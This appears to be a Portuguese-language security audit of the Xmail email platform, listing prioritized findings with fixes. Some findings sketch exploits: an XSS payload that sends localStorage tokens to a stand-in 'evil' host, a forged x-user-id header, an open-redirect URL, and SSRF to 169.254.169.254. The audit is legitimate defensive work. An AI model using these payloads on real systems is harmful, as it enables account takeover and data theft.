# Auditoria completa do sistema — Xmail

> **DOCUMENTO HISTÓRICO — não trate os achados abaixo como estado atual.**
> Este relatório foi produzido na branch `claude/system-error-analysis-9k0pyj`, que forkou
> em 2026-07-08, **antes do rebuild v1.4 de outreach**. A branch foi deletada em 2026-08-14
> depois que este relatório foi resgatado para `main`; o código dela nunca foi merjado
> (17 arquivos em conflito, e a `032_reconcile_unique_indexes.sql` colidia de prefixo com
> a `032_add_native_email_provider.sql`).
>
> Em **2026-07-18** todos os achados P0–P2 foram re-verificados contra `main`: cerca de 10
> já estavam corrigidos, 2 ficaram obsoletos (mecanismo reescrito no v1.4) e ~16 seguiam
> abertos. Antes de agir sobre qualquer item daqui, confirme no código atual.

**Data:** 2026-07-09
**Escopo:** auth/autorização, rotas de API, stack de e-mail (SMTP/IMAP/MX), jobs/outreach/tracking, schema & migrações, frontend, infra/deploy.
**Método:** verificação estática (`eslint` limpo, `tsc` cliente + servidor sem erros) + revisão manual por subsistema. Cada achado foi verificado no código real.

Legenda de severidade: **P0 crítico** (perda de dados, bypass de auth, ou envio/deploy quebrados) · **P1 alto** · **P2 médio** · **P3 baixo/melhoria**.

---

## Resumo executivo — o que corrigir primeiro

| # | Severidade | Achado | Arquivo |
|---|-----------|--------|---------|
| 1 | **P0** | Bypass de autenticação em `PATCH /api/system/branding` via header `x-user-id` forjável | `src/server/index.ts:232-303`, `routes/system.ts:22-32` |
| 2 | **P0** | Índice único `outreach_emails_campaign_lead_step_unique` só existe no schema TS, não em SQL → `ON CONFLICT` quebra o envio de outreach | `src/db/schema.ts:910` vs `supabase/migrations/*` |
| 3 | **P0** | Advisory locks adquiridos/liberados em conexões aleatórias do pool; helper correto `runWithLock` tem zero chamadores → double-send entre containers | `jobs/processOutreachSequences.ts:528`, `processReplies.ts:53`, `processBounces.ts:322`, `lib/cron-lock.ts` |
| 4 | **P0** | Push na branch `dev` faz deploy direto em produção (sem gate de ref) | `.github/workflows/build-deploy.yml:20` |
| 5 | **P0** | Drift schema↔migração: tabelas centrais criadas com `server_id NOT NULL` no único DDL-fonte, mas o app usa `organization_id`; sem migração de reconciliação | `drizzle/0000_dear_wolverine.sql` vs `src/db/schema.ts` |
| 6 | **P1** | Open-redirect no click-tracking: redireciona antes de validar o token | `src/server/routes/track.ts:136-160` |
| 7 | **P1** | Spoofing cross-tenant na submissão 587: entrega local ignora SPF/DKIM/DMARC e confia no header `From` | `src/server/smtp-server.ts:234-257` |
| 8 | **P1** | `BASE_URL` lido no código mas não definido em lugar nenhum → links de tracking apontam para `localhost` em produção | `routes/messages.ts:289` |

---

## P0 — Críticos

### P0-1. Bypass de autenticação em `PATCH /api/system/branding`
`PUBLIC_PATHS` contém `/api/system/branding` e o gate compara só o path (`path === p`), sem método. A intenção é liberar o **GET**, mas o **PATCH** casa no mesmo path e pula o middleware JWT. O middleware `/api` **nunca remove** um `x-user-id` vindo do cliente — só o sobrescreve *depois* de autenticar, o que aqui não acontece. O handler autoriza via `getRequestingUser(req)`, que confia em `req.headers['x-user-id']` direto e checa `isAdmin`.
- **Exploração:** atacante não autenticado envia `PATCH /api/system/branding` com `x-user-id: <uuid de um admin>` e sem Bearer. Passa direto e altera `companyName`, `applicationName` e `mailHost`. Trocar `mailHost` corrompe as infos de conexão SMTP/IMAP mostradas a todos os usuários (vetor de phishing/sequestro de e-mail).
- **Correção (uma linha resolve a classe inteira):** no topo do middleware `/api`, antes de qualquer `return next()` de path público, `delete req.headers['x-user-id']` (e demais `x-user-*`). Além disso, tornar o match de path público sensível ao método (só `GET`).

### P0-2. Índice único de idempotência do outreach ausente no SQL
O claim em `processOutreachSequences.ts:322-335` usa `onConflictDoNothing({ target: [campaignLeadId, sequenceStepId] })`, que exige o índice `outreach_emails_campaign_lead_step_unique`. **Verifiquei: esse índice existe só em `src/db/schema.ts:910`** (que por CLAUDE.md é type-info, nunca aplicado) — `grep` em `supabase/migrations/`, `drizzle/` e `sql/` retorna zero. A migração 027 cria apenas `outreach_emails_tracking_token_unique`.
- **Falha:** em qualquer ambiente construído a partir das migrações, `INSERT ... ON CONFLICT (campaign_lead_id, sequence_step_id)` levanta `42P10 "no unique or exclusion constraint matching the ON CONFLICT specification"` em **todo** envio → outreach totalmente morto (capturado por-lead, logado como erro). Se a prod atual tem o índice de um `db:push` pré-Phase-13, funciona hoje mas qualquer rebuild/restore de DR perde a garantia. O mesmo vale para `suppression_org_email_unique` (schema.ts:352) e `stats_org_date_unique` (usado no `ON CONFLICT` de `tracking.ts:112`).
- **Correção:** migração 032 idempotente com `CREATE UNIQUE INDEX IF NOT EXISTS` para os três índices (dedup antes se necessário). Verificar contra a prod com `\di`.

### P0-3. Advisory locks quebrados; `runWithLock` é código morto
Os três wrappers "P0-06" fazem `db.execute(pg_try_advisory_lock)` → trabalho → `db.execute(pg_advisory_unlock)` através do **pool** postgres-js (`max: 20`, `idle_timeout: 10s`). Locks de advisory do Postgres são por-sessão:
- o lock cai numa conexão livre; o unlock quase sempre roda em **outra** conexão → falha em silêncio e o lock fica preso;
- `idle_timeout: 10` fecha a conexão que segura o lock ~10s depois (ela fica ociosa enquanto o tick roda em outras conexões) → **o lock evapora no meio do tick** e um container irmão (blue-green) pode adquirir e rodar concorrente.
- **Verifiquei:** `runWithLock()` em `lib/cron-lock.ts` (implementação correta com `.reserve()` de UMA conexão para lock+trabalho+unlock) tem **zero chamadores**. `processQueue.ts` nem lock tem — só um boolean `running` em memória.
- **Impacto:** na janela de overlap de deploy, os dois containers rodam o tick de 5 min acreditando ter o lock → double-send de e-mail transacional e de outreach.
- **Correção:** envolver os quatro processadores (+ `resetDailyLimits`) com `runWithLock`; para `processQueue`, claim atômico de linha (`UPDATE ... SET status='sending' ... RETURNING`).

### P0-4. Push em `dev` faz deploy em produção
`build-deploy.yml:20` tem `on.push.branches: [main, dev]` sem nenhum gate de ref no job. Qualquer push em `dev` sobrescreve `ghcr.io/.../xmail:latest` e o promove como container de produção — derrubando `mail.skale.club` e o MX ativo com trabalho pela metade.
- **Correção:** `branches: [main]`, ou `if: github.ref == 'refs/heads/main'` no step de deploy (mantendo `dev` build-only se desejado).

### P0-5. Drift schema↔migração nas tabelas centrais
O único DDL-fonte das tabelas centrais (`drizzle/0000_dear_wolverine.sql`) cria `domains`, `credentials`, `routes`, `messages`, `deliveries`, `webhooks`, etc. com **`server_id NOT NULL`**. `src/db/schema.ts` declara todas com `organization_id`. **Nenhuma migração** em `supabase/migrations/` renomeia `server_id`→`organization_id` nessas tabelas (008 só dropa a tabela `servers`). Consequência: os índices únicos `stats_org_date_unique` e `suppression_org_email_unique` também não têm fonte SQL.
- **Falha:** um ambiente novo construído de `0000` + migrações produz um DB em que o app não roda (inserts falham em `server_id NOT NULL`; `tracking.ts` quebra no `ON CONFLICT (organization_id, date)`). A prod foi claramente reestruturada à mão, fora do repo — o invariante "migrações = fonte da verdade" está quebrado.
- **Correção:** migração de reconciliação (nos moldes da `015`) que idempotentemente adiciona/renomeia para `organization_id` e cria os índices únicos org-scoped faltantes.

---

## P1 — Altos

### P1-6. Open-redirect no click-tracking
`GET /t/click/:token?u=<base64url>` decodifica `u`, checa só protocolo + host-privado e faz `res.redirect(302, targetUrl)` **antes** de olhar o token (o lookup vem depois, na linha 166). O token nunca é verificado por HMAC e a URL não é vinculada a ele.
- **Exploração:** `https://mail.skale.club/t/click/xxxx?u=<base64(https://evil/login)>` — redirect do seu domínio de reputação para qualquer URL do atacante (phishing).
- **Correção:** verificar o token (ou casar `messages.token`) e 404 antes de redirecionar; idealmente assinar `u`+HMAC no momento da injeção (`tracking.ts:26`).

### P1-7. Spoofing cross-tenant na submissão (porta 587)
A entrega local do submission server (`smtp-server.ts:234-257`) armazena a mensagem usando `parsed.from.address` (header controlado pelo cliente) na INBOX do destinatário, **sem `verifyInbound` (SPF/DKIM/DMARC)** — essa checagem só existe no caminho MX. `isLocalAddress` trata qualquer domínio verificado de qualquer org como "local".
- **Exploração:** usuário de baixo privilégio da org A autentica no 587, faz `RCPT TO: ceo@orgB.com` com `From: security@bigbank.com`. Cai na inbox da org B exibido como do banco, sem nenhuma autenticação inbound.
- **Correção:** no caminho de submissão, forçar o `From` armazenado para o `user.email` autenticado (ou rejeitar se o header `From` não alinhar), e/ou rotear a entrega local pelo mesmo `verifyInbound` do MX.

### P1-8. `BASE_URL` ausente → links de tracking quebrados em produção
`messages.ts:289` lê `process.env.BASE_URL || http://localhost:${PORT}`. `BASE_URL` não está em `run_app_container` (build-deploy.yml), nem no workflow legado, nem no compose, nem no `.env.example`. Como o click-tracking **reescreve os links do destinatário** via `<base>/t/click/...`, todo e-mail rastreado do `/api/messages` envia links `localhost` mortos e nunca registra open/click. (O caminho de outreach não é afetado — cai em `FRONTEND_URL`.)
- **Correção:** adicionar `-e BASE_URL="https://mail.skale.club"` ao `run_app_container` (+ legado + `.env.example`), ou fazer `messages.ts` cair em `FRONTEND_URL` como o outreach faz.

### P1-9. Gate de health do deploy é só liveness → build quebrado é promovido
`build-deploy.yml:201` checa `/health`, que retorna 200 assim que o Express escuta: sem checagem de DB (postgres.js conecta preguiçosamente, então `DATABASE_URL`/`SUPABASE_*` errado passa) e falhas de startup do mail são engolidas por um `console.warn`. O código já tem o endpoint certo — `/health/ready` (DB + auth, 503 em falha) e `/health/mail` com `tls.loaded`.
- **Correção:** apontar o gate para `/health/ready` e opcionalmente exigir `tls.loaded == true`.

### P1-10. Webhook dispatch segue redirects → bypass de SSRF
A validação SSRF (`isPrivateHostWithDns`, sólida) só roda na escrita; o `fetch()` de dispatch usa `redirect: 'follow'` (default). Um webhook em URL pública pode responder `302 Location: http://169.254.169.254/...` e o undici segue. O corpo da resposta interna (até 5000 chars) é gravado em `webhook_requests` e legível pela org → primitiva de leitura SSRF completa.
- **Correção:** `redirect: 'manual'` em `fireWebhooks` e no `/test`; idealmente pinar o IP validado no dispatch.

### P1-11. Bypass de rate-limit / spoof de IP via porta 9001 pública
`trust proxy: 1` faz `req.ip` derivar de `X-Forwarded-For` do cliente, mas a 9001 é publicada direto na internet. Um atacante que conecta direto (não via Traefik) controla totalmente `req.ip`, girando o header a cada request → o `authLimiter` (10/15min) vê cada request como um IP novo → brute-force de senha ilimitado.
- **Correção:** firewall nas portas 9001 (só Traefik/loopback), ou publicar `-p 127.0.0.1:9001:9001`, ou `trust proxy` para o IP/subnet específico do proxy.

### P1-12. Leads de outreach travam permanentemente após uma falha de envio
O check de idempotência casa **qualquer** linha `outreach_emails` para `(campaignLead, step)`, inclusive `status='failed'` e claims órfãos (crash entre claim e send). Nenhum caminho de skip/falha toca `nextScheduledAt` nem avança o step.
- **Falha:** uma falha SMTP (senha ruim, greylist) deixa a linha `failed`, `nextScheduledAt <= now` fica, e todo tick recarrega e pula o lead, para sempre. Com 200 leads presos, `PENDING_LEADS_LIMIT` satura e **o processador não envia nada para ninguém**.
- **Correção:** em `failed`/`claim_conflict`, reagendar (bump `nextScheduledAt` com contador de tentativas) ou excluir linhas terminais da query pendente.

### P1-13. XSS armazenado no preview de template (admin)
`TemplatesTab.tsx:491-494` injeta `previewResult.htmlBody` via `dangerouslySetInnerHTML` **sem sanitização** (não há DOMPurify no projeto) e sem iframe sandbox — diferente do visualizador de e-mail.
- **Exploração:** membro com escrita de template salva `<img src=x onerror="fetch('//evil',{body:localStorage...})">`. Quando outro admin clica "Render Preview", executa na origem do app. Tokens do Supabase (access + refresh, de todas as contas) vivem no localStorage → account takeover.
- **Correção:** renderizar o preview no `EmailHtmlViewer` (iframe sandbox) ou sanitizar com DOMPurify.

### P1-14. Dois clientes de API divergentes → logout global perde todas as sessões
Existem dois clientes: o bom (`api-client.ts`, com refresh-on-401) e `api.ts`, cujo `handleUnauthorized()` faz `supabase.auth.signOut()` + redirect em **qualquer** 401 sem tentar refresh. Todas as chamadas de mail/contatos/notificações usam `mail-api.ts` → `api.ts`.
- **Falha:** um request de mailbox que 401 num token transitoriamente expirado dispara `signOut()` global → `clearAllSessions()` despeja **todas** as contas, não só a ativa. O `api-client` teria feito refresh silencioso.
- **Correção:** rotear `mail-api.ts` pelo `api-client.ts` (unificar os dois clientes — também é a melhor melhoria de DRY).

### P1-15. Runner de migração quebra em `CREATE INDEX CONCURRENTLY`
`scripts/apply-pending-migrations.mjs:65` envolve cada migração em `sql.begin(...)`, mas `022` usa `CREATE INDEX CONCURRENTLY`, que não roda em transação → `process.exit(2)` e as migrações 023-031 nunca aplicam. Secundário: 021/027/028/029 têm seus próprios `BEGIN/COMMIT`, e o `COMMIT` interno encerra a transação externa cedo.
- **Correção:** remover `BEGIN/COMMIT` dos arquivos de migração e detectar `CONCURRENTLY` no runner (rodar não-transacional), ou tirar `CONCURRENTLY` da 022.

### P1-16. Índice único de `mail_messages` divergente (folder vs mailbox)
SQL (`006_mail_tables.sql:89`) cria `mail_message_mailbox_uid_unique (mailbox_id, remote_uid)`; schema TS (`schema.ts:1246`) declara `mail_message_folder_uid_unique (folder_id, remote_uid)` — que **nada cria**. UIDs de IMAP são únicos por-folder (RFC 3501), não por-mailbox. Quando o folder B tem um UID já presente no folder A do mesmo mailbox, o insert viola o unique do DB → erro de sync ou (nos inserts com `onConflictDoNothing` do `imap-server.ts`) **drop silencioso** de mensagem legítima.
- **Correção:** migração que dropa o índice antigo e cria `(folder_id, remote_uid) WHERE remote_uid IS NOT NULL`.

### P1-17. `MICROSOFT_CLIENT_ID/SECRET/REDIRECT_URI` ausentes de todos os ambientes
Usados via `getRequiredEnv()` (que lança) em `lib/outlook.ts:121-122,210`, mas não estão em nenhum workflow, `.env.example` ou compose → todo fluxo OAuth `/api/outlook` dá 500 em produção.
- **Correção:** adicionar os três secrets ao `run_app_container` (ou documentar que a integração está desativada).

---

## P2 — Médios

- **MX fail-open:** `verifyInbound` retorna `null` em qualquer exceção do mailauth → mensagem entregue na INBOX sem DMARC. Um payload que faça o mailauth lançar entrega um spoof de domínio `p=reject` sem marca. Tratar `null` como softfail/451. (`mx-server.ts:258`, `mail-auth.ts:78`)
- **Header injection no envio nativo:** `send.ts:248-260` monta o RFC822 à mão interpolando `subject`/`inReplyTo`/`references`/`name` sem stripar CRLF (Zod só valida `max`). Injeção de `Reply-To`/headers arbitrários. Adicionar `.regex(/^[^\r\n]*$/)`. 
- **SSRF em endpoints de rota:** `deliverViaRoutes` (`route-matcher.ts:278`) faz `fetch(cfg.url)` sem `isPrivateHostWithDns`, ao contrário de webhooks/track. Rota apontando para `169.254.169.254` vira SSRF cega a cada mensagem inbound.
- **`viewer` pode enviar e-mail:** `POST /api/messages` (`messages.ts:203`) checa só membership, sem bloquear o papel `viewer` (todas as outras rotas de escrita bloqueiam). Adicionar guarda de papel.
- **`PUT /api/routes/:id` reseta `spamThreshold` para 5:** o campo é `.default(5)` em vez de `.optional()` no schema de update (`routes.ts:20`); update parcial sem o campo sobrescreve o valor ajustado.
- **Paginação sem limite:** `outreach/leads.ts:208` e `outreach/campaigns.ts:913` usam `parseInt(...)||n` sem clamp → `?limit=100000000` (DoS) e `?page=-5` (OFFSET negativo → 500). Usar `paginationQuerySchema`.
- **Endpoint PII não autenticado:** `GET /o/u/check/:leadId/:campaignId` (`unsubscribe.ts:403`) retorna e-mail/status do lead sem token nem auth (os outros endpoints de unsubscribe exigem HMAC). IDs de lead circulam em payloads Xphere. Remover ou exigir token.
- **Reset de senha por org-admin atinge platform-admins:** `users.ts:490-543` não exclui alvos `isAdmin` nem exige que o requester supere o alvo; min de 6 chars aqui vs 8 em todo o resto. Adicionar guarda `targetUser.isAdmin`.
- **Cache de token sem invalidação:** `auth-cache.ts` cacheia token→user por 60s sem hook de logout/delete/troca de senha. Token de usuário deletado passa o gate por até 60s. Exportar/chamar um `invalidateToken`.
- **Suppression case-sensitive:** suppressions são gravadas em lowercase, mas o processador compara o `lead.email` cru (nunca normalizado na importação). `John.Doe@x.com` re-importado passa pela lista de supressão.
- **Match de resposta nunca casa (Tier 1/2):** `info.messageId` é armazenado com `<>` mas a query compara sem os brackets (`processReplies.ts:396`) → sempre cai no heurístico de from-address; envios via Outlook não têm messageId. Stripar `<>` antes de gravar.
- **Soft bounce mata o lead:** `markAsBounced` ignora `bounceType` — "mailbox full"/greylist marca o lead como `bounced` globalmente. Reagendar soft bounces.
- **`processBounces` re-varre a INBOX inteira a cada 30 min:** busca sem `since:`/`seen:false`; um search falho em uma conta dá `return` (pula todas as outras); `LIKE '%%'` num Message-ID `<>` casa e-mail arbitrário. (`processBounces.ts:376,385,220`)
- **Certificado TLS de mail cacheado para sempre:** `mail-tls.ts` lê o cert uma vez no boot; após renovação do certbot, as portas 25/587/993 servem o cert antigo até o próximo redeploy. `resetMailTLSCache` existe mas ninguém chama. Re-ler por intervalo/mtime.
- **Provider enum vs varchar:** `schema.ts` declara `pgEnum('email_provider', ...)` e `notNull`, mas o SQL (`012`) cria `VARCHAR(20)` nullable e o tipo enum não existe no DB. Alinhar (trocar para `text()` ou criar o enum).

---

## P3 — Baixos / Melhorias

**Backend/jobs**
- `markCompletedCampaigns` e `resetDailyLimits` sem lock; a segunda pode dobrar o warmup num overlap às 00:00 UTC.
- Sem dedup real de open/click apesar do comentário "COR-03 60s dedup" — SafeLinks/prefetch inflam contadores.
- `template-variables.ts` usa a saída como replacement de `String.replace` → dados com `$&`/`$'` corrompem; injeção não-escapada em HTML.
- `import('./jobs/index').then(...)` sem `.catch` → rejeição não tratada pode derrubar o processo (`index.ts:410`).
- `cleanupMessages` deleta linha-a-linha em loop; usar `inArray`.
- Falhas de relay engolidas e reportadas como sucesso (`smtp-server.ts:288`, `send.ts:328`) — e-mail some sem bounce.
- Envio nativo do webmail não assina DKIM e descarta anexos (`createMultipartEmail` ignora `attachments`).
- Greylist facilmente contornável (chave `envelopeFrom|rcpt`, bypass por "known sender" em campo não autenticado); adicionar IP à chave.
- Sync IMAP faz check-then-insert sem `onConflictDoNothing` → duplicatas em sync concorrente (`mail-sync.ts:362`).
- `SSRF DNS-rebinding` residual em webhooks (TOCTOU entre validação e fetch).

**Frontend**
- `navigate()` chamado no corpo de render (`main.tsx:139,146,182`) — mover para `useEffect`.
- Inbox filtra/busca client-side só sobre os 50 primeiros; Starred busca inbox-200 e filtra — starred em Sent/Archive somem. Usar query server-side.
- Efeito "mark as read" com objeto de mutation nas deps (`EmailDetailPage.tsx:236`) — pode disparar PUTs redundantes.
- `SearchPage`/`MailLayout` usam `window.history.pushState`/`window.location.href` em vez do `navigate` do wouter — dessincroniza back/forward e força reload.
- Mock data (`mockEmails`/`mock-data.ts`, ~300 linhas) enviado no bundle e checado antes da API real; deletar.
- Star no thread view é no-op com toast de sucesso (`EmailDetailPage.tsx:549`).
- `OrganizationProvider`/`MailboxProvider` não recarregam ao trocar de sessão/conta.

**Infra/build**
- Deploy usa `docker rm -f` (SIGKILL) — o shutdown gracioso (`index.ts:310`) nunca roda; transações SMTP em voo são cortadas. Usar `docker stop -t 15`.
- Rollback: `:previous` é tag do `:latest` antes do pull → dois deploys ruins seguidos restauram build quebrado; abortar no meio do rollback deixa o Traefik apontando para `xmail-next`. `run_app_container` sem sweep de porta de mail (a versão legada tinha).
- Secrets interpolados crus no script SSH remoto (`SMTP_PASS` com `$`/backtick/`"` quebra o deploy); usar o mecanismo `envs:` do ssh-action.
- Dockerfile single-stage embarca todas as devDependencies (~100 MB de `supabase` CLI etc.), roda como root, sem `HEALTHCHECK`; `.dockerignore` não exclui `hermes/`, `docs/`, `.env.*`.
- `docker-compose.yml` sem paridade de env com a prod; chave `version:` obsoleta.
- `.env.example` faltam ~15 vars lidas no código (`BASE_URL`, `MICROSOFT_*`, `MONITOR_API_TOKEN`, `DB_POOL_MAX`, `MESSAGE_RETENTION_DAYS`, `DIRECT_URL`, etc.).
- `/health/mail` público expõe fingerprint de infra (env setadas, paths de cert, portas). Gatear atrás de auth admin.

**Schema/docs**
- Convenção "índices definidos em dois lugares" quebrada nos dois sentidos (vários índices só em SQL ou só no TS); nomes duplicados no mesmo conjunto de colunas.
- Sem índice `(organization_id, created_at)` no hot path de `messages` e `(folder_id, received_at)` no webmail.
- Headers de arquivo desatualizados (`027` diz "020", `028` diz "021"); CLAUDE.md descreve tabela `servers`/`?serverId=` já removidos e numeração de migração obsoleta.
- `drizzle/0000_dear_wolverine.sql` ainda contém o schema legado server-scoped inteiro — perigoso para bootstrap; mover para `archive/` com aviso.
- `mail_folders` sem policy de UPDATE no RLS (defense-in-depth).

---

## Áreas verificadas e sólidas
- **Sem open relay:** MX rejeita destinatário não-local/não-roteado (550); submissão exige auth.
- **Isolamento de tenant no IMAP e nas rotas de API:** toda query escopada por `mailboxId`/`companion.id`; cobertura de `checkXAccess` consistente nas rotas (sem IDOR via ID de parent do cliente).
- **crypto.ts:** AES-256-GCM com IV aleatório por chamada, tag verificada; **outreach-tokens.ts:** HMAC com `timingSafeEqual`, fail-loud.
- **Mutations do React Query** (`useMail.ts`): snapshot/cancel/rollback/invalidate corretos.
- **`cron-lock.ts`** em si é uma implementação correta — o bug é que nada o usa.
- **Verificação estática limpa:** `eslint` (zero warnings), `tsc` cliente + servidor sem erros; o build do servidor gera CJS que carrega.

---

*Nenhuma correção foi aplicada — este documento é diagnóstico. Priorizar P0-1 a P0-5, que são explorável/quebrado-em-produção hoje.*
